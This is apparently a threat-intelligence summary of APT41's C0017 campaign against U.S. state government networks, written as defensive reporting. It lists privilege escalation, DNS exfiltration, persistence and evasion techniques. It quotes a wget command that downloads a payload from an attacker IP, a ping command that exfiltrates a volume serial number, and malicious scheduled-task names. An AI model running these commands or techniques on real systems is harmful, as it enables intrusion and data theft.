During C0017, APT41 used a ConfuserEx-obfuscated BADPOTATO exploit to abuse named-pipe impersonation for local NT AUTHORITY\SYSTEM privilege escalation. Additionally, they ran wget http://103.224.80[.]44:8080/kernel to download malicious payloads onto compromised systems.

Furthermore, APT41 hex-encoded personally identifiable information (PII) prior to exfiltration and used cmd.exe to execute various reconnaissance commands. They also deployed JScript web shells on compromised systems and collected both machine-specific information and PII from victim networks.

To disguise their activities, APT41 frequently configured the URL endpoints of their stealthy passive backdoor LOWKEY.PASSIVE to masquerade as normal web application traffic on infected servers. They copied the local SAM and SYSTEM registry hives to a staging directory for credential harvesting.

APT41 also employed the DUSTPAN loader to decrypt embedded payloads and exfiltrated data using DNS lookups by encoding and prepending it as subdomains to attacker-controlled domains. In parallel, they leveraged Cloudflare services and CDN infrastructure both for command-and-control (C2) communications and data exfiltration.

To gain initial access, APT41 exploited multiple vulnerabilities, including CVE-2021-44207 in the USAHerds application, CVE-2021-44228 in Log4j, as well as .NET deserialization, SQL injection, and directory traversal vulnerabilities.

For persistence, they loaded malicious libraries via modifications to the Import Address Table (IAT) within legitimate Microsoft binaries. In addition, they used SCHTASKS /Change to modify legitimate scheduled tasks to execute malicious code.

APT41 adopted naming conventions such as USERS, SYSUSER, and SYSLOG for DEADEYE-related files, and changed KEYPLUG file extensions from .vmp to .upx, likely to evade detection. They further broke malicious binaries, including DEADEYE and KEYPLUG, into multiple sections on disk to avoid antivirus scanning.

To complicate reverse engineering efforts, APT41 used VMProtect, and they incorporated publicly available tools such as YSoSerial.NET, ConfuserEx, and BadPotato into their toolset.

APT41 maintained persistence in U.S. state government networks by using Windows scheduled tasks associated with DEADEYE, including:

\Microsoft\Windows\PLA\Server Manager Performance Monitor

\Microsoft\Windows\Ras\ManagerMobility

\Microsoft\Windows\WDI\SrvSetupResults

\Microsoft\Windows\WDI\USOShared

They also deployed JScript web shells through the creation of malicious ViewState objects.

For system fingerprinting, APT41 issued the command ping -n 1 ((cmd /c dir c:\|findstr Number).split()[-1]+ to retrieve the volume serial number of compromised systems. They also ran cmd.exe /c ping %userdomain% and used whoami for further discovery and enumeration.

Lastly, APT41 used dead drop resolvers on two separate tech community forums to support their Windows-version KEYPLUG backdoor. Notably, they updated the community forum posts frequently with new resolvers during the campaign.